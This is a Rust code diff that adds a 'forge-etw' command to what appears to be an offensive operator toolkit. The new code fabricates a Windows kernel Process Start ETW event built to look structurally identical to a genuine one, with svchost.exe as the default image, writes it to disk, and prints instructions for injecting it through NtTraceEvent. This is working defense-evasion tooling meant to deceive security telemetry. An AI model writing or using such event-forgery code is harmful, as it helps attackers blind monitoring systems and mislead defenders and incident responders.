@@ -393,6 +393,53 @@ fn main() {
             eprintln!("[*] old={old:#04x} new={:#04x} was_set={was}", buf[0]);
         }
 
+        "forge-etw" => {
+            // ETW event forgery — drives the otherwise-dead etw_deception module.
+            // Generates a synthetic Process Start event buffer (structurally
+            // identical to a real Microsoft-Windows-Kernel-Process event) and
+            // writes it to a file for operator review / NtTraceEvent injection.
+            //
+            // Usage: forge-etw <parent_pid> <child_pid> <image_name> [output.bin]
+            let parent_pid = args
+                .get(2)
+                .and_then(|s| s.parse::<u32>().ok())
+                .unwrap_or(4);
+            let child_pid = args
+                .get(3)
+                .and_then(|s| s.parse::<u32>().ok())
+                .unwrap_or(1234);
+            let image_name = args.get(4).cloned().unwrap_or_else(|| {
+                r"C:\Windows\System32\svchost.exe".to_string()
+            });
+            let out_path = args.get(5).cloned().unwrap_or_else(|| {
+                format!("forge_etw_proc_create_{child_pid}.bin")
+            });
+
+            let deceiver = nyx_operator_kernelsdk::etw_deception::EtwDeceiver::with_kernel_defaults();
+            let timestamp = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_nanos() as u64;
+            let buf = deceiver.forge_process_create(
+                parent_pid,
+                child_pid,
+                image_name.as_bytes(),
+                timestamp,
+            );
+            match std::fs::write(&out_path, &buf) {
+                Ok(()) => eprintln!(
+                    "[+] forged Process Start event ({} bytes) written to {out_path}\n    \
+                     parent={parent_pid} child={child_pid} image=\"{image_name}\"\n    \
+                     inject via NtTraceEvent(session_handle, 0, buf.len(), buf)",
+                    buf.len()
+                ),
+                Err(e) => {
+                    eprintln!("[!] failed to write {out_path}: {e}");
+                    std::process::exit(5);
+                }
+            }
+        }
+
         _ => {
             eprintln!("unknown command: {cmd}");
             std::process::exit(1);
